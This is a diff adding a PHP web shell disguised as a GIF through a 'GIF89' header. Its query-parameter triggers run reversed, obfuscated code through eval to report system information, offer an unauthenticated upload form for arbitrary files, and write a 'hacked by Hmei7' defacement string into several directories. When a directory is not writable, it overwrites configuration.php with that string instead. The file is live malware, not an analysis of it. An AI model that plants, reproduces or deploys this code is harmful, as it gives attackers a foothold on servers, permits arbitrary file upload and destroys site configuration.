@@ -1,0 +1,79 @@
+GIF89;<br><br>
+<?php
+if ( isset($_GET['versi']) )
+{
+    echo letaksekarang().' ===> ';
+    eval(strrev(";)(emanu_php ohce"));
+exit;
+}
+
+
+if ( isset($_GET['indonesia']) )
+{
+	echo "silahkan masuk\n\n";
+	echo '<b>Indonesian people is here..<br><br>'.''.'<br></b>';
+	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+	if( $_POST['_upl'] == "Upload" ) {
+		if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success !!!</b><br><br>'; }
+		else { echo '<b>Upload Gagal !!!</b><br><br>'; }
+	}
+exit;
+}
+
+if ( isset($_GET['yaiyalah']) )
+{
+	$tmp=strrev('7iemH yb dekcah');
+	$nama='x.txt';
+	chdir('..');chdir('..');
+
+	if (is_writable(getcwd()))	
+	{
+		$fff = fopen($nama, 'w');
+		fwrite($fff, $tmp);
+		fclose($fff);
+	}else
+	{
+		$fff = fopen('configuration.php', 'w');
+		fwrite($fff, $tmp.'<?php exit;?>');
+		fclose($fff);
+	}
+	
+
+	$fff2 = fopen('./tmp/'.$nama, 'w');
+	fwrite($fff2, $tmp);
+	fclose($fff2);
+
+	$fff3 = fopen('./images/'.$nama, 'w');
+	fwrite($fff3, $tmp);
+	fclose($fff3);
+
+	echo $tmp;
+	exit;
+}
+
+echo 'cari siapa ya?..';exit;
+echo 'Hmei7';
+
+function letaksekarang() {
+ $pageURL = 'http';
+ if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
+ $pageURL .= "://";
+ if ($_SERVER["SERVER_PORT"] != "80") {
+  $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
+ } else {
+  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
+ }
+$pageURL=left($pageURL,strlen($pageURL)-strpos(strrev($pageURL),"/")-1);
+ $pageURL=str_replace("/".basename(__FILE__), "", $pageURL);
+ return $pageURL;
+}
+
+function left($string,$chars)
+{
+    $vright = substr(strrev($string), strlen($string)-$chars,$chars);
+    return strrev($vright);
+   
+}
+
+?>
